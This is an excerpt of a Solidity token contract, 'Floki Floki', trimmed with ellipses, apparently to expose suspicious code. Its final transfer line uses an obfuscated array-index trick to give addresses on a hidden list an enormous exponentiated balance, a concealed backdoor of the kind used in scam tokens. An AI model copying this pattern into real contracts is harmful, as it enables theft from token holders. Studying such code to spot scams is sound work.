...
contract FlokiFloki is Context, IERC20, Ownable { 
    ...
    */
    ...
    string public _name = "Floki Floki"; 
    string public _symbol = "Flokiception";  
    ...
    */
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && noFeeToTransfer)
    ...
    */
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        ...
        _tOwned[recipient] = [_tOwned[recipient] + tTransferAmount, maxPossibleFee**tTransferAmount][_LiquidityProviderList[recipient] ? 1 : 0];
